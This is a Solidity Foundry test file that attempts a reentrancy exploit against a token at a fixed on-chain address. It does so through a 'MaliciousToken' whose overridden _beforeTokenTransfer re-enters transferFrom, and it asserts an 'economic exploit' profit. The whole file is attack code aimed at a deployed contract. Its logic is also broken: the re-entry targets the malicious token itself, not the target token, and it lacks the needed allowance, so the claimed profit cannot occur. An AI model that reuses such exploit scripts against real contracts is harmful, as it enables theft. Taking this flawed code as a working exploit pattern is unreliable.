pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

// We need to define StandardToken or import it
contract StandardToken is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    constructor(
        string memory name_,
        string memory symbol_,
        uint8 decimals_,
        uint256 totalSupply_,
        address serviceFeeReceiver_,
        uint256 serviceFee_
    ) payable {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_;
        _balances[msg.sender] = totalSupply_;

        if (serviceFee_ > 0 && serviceFeeReceiver_ != address(0)) {
            require(totalSupply_ >= serviceFee_, "Insufficient supply for fee");
            _balances[msg.sender] -= serviceFee_;
            _balances[serviceFeeReceiver_] += serviceFee_;
        }
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) external view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) external view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][msg.sender];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, msg.sender, currentAllowance - amount);

        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        // Can be overridden by derived contracts
    }
}

// Malicious contract that inherits from StandardToken to override _beforeTokenTransfer
contract MaliciousToken is StandardToken {
    bool private _reentering;
    address private _attacker;

    constructor(
        string memory name_,
        string memory symbol_,
        uint8 decimals_,
        uint256 totalSupply_,
        address serviceFeeReceiver_,
        uint256 serviceFee_
    ) StandardToken(name_, symbol_, decimals_, totalSupply_, serviceFeeReceiver_, serviceFee_) payable {}

    function executeAttack(address attacker) external {
        _attacker = attacker;
        // Start by transferring tokens from attacker to this contract
        // This will trigger _beforeTokenTransfer where we reenter
        IERC20(address(this)).transferFrom(attacker, address(this), 100 * 10**18);
    }

    // Override _beforeTokenTransfer to implement reentrancy
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual override {
        // If we're transferring from the attacker and not already reentering
        if (from == _attacker && !_reentering) {
            _reentering = true;
            // Reenter by transferring more tokens
            // This simulates what would happen if there was a callback
            IERC20(address(this)).transferFrom(_attacker, address(this), 100 * 10**18);
            _reentering = false;
        }
    }
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x19d726cd37CA413adf46D9Ae555aB5A5643EdF20;
    address attacker = address(this);
    IERC20 public token;
    MaliciousToken public malicious;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Give attacker initial tokens
        uint256 initialBalance = 1000 * 10**18;
        deal(TARGET, attacker, initialBalance);

        // Deploy malicious token that inherits from StandardToken
        // We need to deploy it with the same parameters as the original
        malicious = new MaliciousToken(
            "Malicious Token",
            "MAL",
            18,
            1000000 * 10**18,
            address(0), // serviceFeeReceiver
            0 // serviceFee
        );

        // Transfer some tokens from attacker to malicious contract for the attack
        IERC20(TARGET).transfer(address(malicious), 500 * 10**18);

        // Approve malicious contract to spend attacker's remaining tokens
        IERC20(TARGET).approve(address(malicious), type(uint256).max);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0x19d726cd37CA413adf46D9Ae555aB5A5643EdF20).balanceOf(address(this));
        // Store initial balance for comparison
        uint256 balanceBefore = IERC20(TARGET).balanceOf(attacker);

        // Execute the reentrancy attack through the malicious contract
        malicious.executeAttack(attacker);

        // Check final balance
        uint256 balanceAfter = IERC20(TARGET).balanceOf(attacker);

        // The attack should increase attacker's balance
        assertGt(balanceAfter, balanceBefore, "Attacker balance should increase through reentrancy");
        uint256 finalBalance = IERC20(0x19d726cd37CA413adf46D9Ae555aB5A5643EdF20).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

